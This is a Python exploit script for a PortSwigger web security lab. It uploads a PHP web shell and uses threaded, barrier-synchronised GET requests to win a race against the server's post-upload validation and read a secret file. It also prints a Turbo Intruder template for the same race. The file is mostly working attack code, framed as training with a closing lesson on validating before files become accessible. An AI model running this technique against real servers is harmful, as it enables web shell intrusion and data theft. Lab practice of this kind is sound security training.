# Lab 07 — Web shell upload via race condition
# PortSwigger: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
#
# Vulnerability: File validation happens AFTER the uploaded file is
#                already written to disk — move_uploaded_file() runs
#                FIRST, then checkViruses()/checkFileType() run SECOND,
#                deleting the file only if it fails. This creates a brief
#                window where a malicious file is live and executable.
# Aim:           Upload a basic PHP web shell and exfiltrate
#                /home/carlos/secret
#
# Technique:
#   Every technique from Labs 01-06 is blocked here — validation is
#   otherwise thorough. The exploit is PURELY about TIMING: fire the
#   upload POST and a burst of GET requests (attempting to fetch/execute
#   the file) at virtually the same instant, using Python's threading to
#   approximate Burp's Turbo Intruder 'gate' mechanism. If ANY GET request
#   lands during the brief window after the file is written but before
#   it's deleted, the PHP executes and the secret is exfiltrated.
#
#   ⚠  This requires GENUINE speed and concurrency to have a realistic
#      chance of landing in the race window. Burp's Turbo Intruder
#      extension is purpose-built for this and generally more reliable
#      than a pure-Python approach — this script's threading-based
#      approach approximates the same idea using `requests` + threads,
#      and may need several attempts (re-runs) to land in the window.
#
# Usage: python file_upload_lab07.py <url> [attempts_per_round] [rounds]

import sys
import threading
import queue
import urllib3
from proxies import proxies
from file_upload_utils import (banner, section, make_session, login,
                                get_csrf_from_response, PHP_PAYLOAD,
                                check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

AVATAR_PATH = "/files/avatars/exploit.php"


def upload_worker(session, url, csrf, result_queue, barrier):
    """Fire the malicious upload POST, synchronised via a barrier."""
    barrier.wait()  # all threads release at (near) the same instant
    files = {"avatar": ("exploit.php", PHP_PAYLOAD.encode(), "image/jpeg")}
    data = {"csrf": csrf} if csrf else {}
    r = session.post(f"{url}/my-account/avatar", files=files, data=data)
    result_queue.put(("upload", r))


def fetch_worker(session, url, barrier, result_queue):
    """Repeatedly attempt to GET the (possibly still-live) uploaded file."""
    barrier.wait()  # released at the same instant as the upload thread
    r = session.get(f"{url}{AVATAR_PATH}")
    result_queue.put(("fetch", r))


if __name__ == "__main__":
    banner()
    section("LAB 07 — WEB SHELL UPLOAD VIA RACE CONDITION")

    if len(sys.argv) < 2:
        print("  Usage: python file_upload_lab07.py <url> [attempts_per_round] [rounds]")
        sys.exit(1)

    url = sys.argv[1]
    attempts_per_round = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    rounds = int(sys.argv[3]) if len(sys.argv) > 3 else 20

    session = make_session(proxies)
    if not login(session, url):
        sys.exit(1)

    account_page = session.get(f"{url}/my-account")
    csrf = get_csrf_from_response(account_page.text)

    print(f"\n  ℹ  Strategy: {rounds} rounds, each firing 1 upload POST +")
    print(f"     {attempts_per_round} parallel GET requests simultaneously,")
    print(f"     using a thread barrier to synchronise their release.\n")
    print("  ⚠  Pure-Python threading has more timing jitter than Burp's")
    print("     Turbo Intruder — this may take several rounds/re-runs to")
    print("     land a GET request inside the validate-then-delete window.\n")

    found_secret = None

    for round_num in range(1, rounds + 1):
        result_queue = queue.Queue()
        # +1 for the upload thread itself
        barrier = threading.Barrier(attempts_per_round + 1)

        threads = []

        # One thread performs the malicious upload
        upload_session = make_session(proxies)
        upload_session.cookies.update(session.cookies)
        t_upload = threading.Thread(
            target=upload_worker,
            args=(upload_session, url, csrf, result_queue, barrier)
        )
        threads.append(t_upload)

        # Multiple threads race to fetch/execute the file
        for _ in range(attempts_per_round):
            fetch_session = make_session(proxies)
            fetch_session.cookies.update(session.cookies)
            t_fetch = threading.Thread(
                target=fetch_worker,
                args=(fetch_session, url, barrier, result_queue)
            )
            threads.append(t_fetch)

        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=15)

        # Check all fetch results from this round for a successful hit
        while not result_queue.empty():
            kind, response = result_queue.get()
            if kind == "fetch" and response.status_code == 200 and "<?php" not in response.text:
                if len(response.text.strip()) > 0 and "Not Found" not in response.text:
                    found_secret = response.text.strip()

        if found_secret:
            print(f"  ✔  Race window hit on round {round_num}!")
            break

        print(f"  ·  round {round_num}/{rounds} — no hit yet")

    if found_secret:
        print_box("LEAKED SECRET", found_secret)
    else:
        print()
        print("  ✘  No successful hit across all rounds.")
        print("     This is expected — pure-Python threading has real limits")
        print("     for millisecond-scale race conditions. Recommended next step:")
        print("     use Burp Suite's Turbo Intruder extension with the gate/")
        print("     openGate mechanism described in the module notes, which is")
        print("     purpose-built for this exact scenario and far more reliable.")
        print()
        print("     Turbo Intruder script template (paste into its Python editor):")
        print_box("Turbo Intruder script", '''
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)
    request1 = \'\'\'<YOUR-POST-UPLOAD-REQUEST-WITH-exploit.php>\'\'\'
    request2 = \'\'\'<YOUR-GET-REQUEST-FOR-/files/avatars/exploit.php>\'\'\'
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
'''.strip())

    print()
    print("  ℹ  The core lesson holds regardless of which tool lands the hit:")
    print("     'validated' is not the same claim as 'validated BEFORE becoming")
    print("     accessible.' Any gap between those two creates a race window.")
